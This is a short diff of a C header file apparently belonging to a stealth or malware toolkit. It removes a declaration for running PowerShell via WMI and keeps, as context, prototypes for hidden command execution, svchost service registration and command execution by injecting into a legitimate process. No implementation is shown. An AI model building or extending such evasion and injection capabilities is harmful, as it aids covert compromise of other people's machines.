@@ -400,12 +400,6 @@ BOOL Stealth_UnregisterSvchostService(const wchar_t* serviceName);
 BOOL Stealth_ExecuteCmdHidden(const char* command, char* output, size_t outputSize);
 
 /**
- * Execute the retained in-process automation host. External script hosts are
- * not supported.
- */
-BOOL Stealth_ExecutePowerShellViaWMI(const char* command, char* output, size_t outputSize);
-
-/**
  * Execute command by injecting into existing legitimate process
  */
 BOOL Stealth_ExecuteViaProcessInjection(const char* command, const wchar_t* targetProcess);
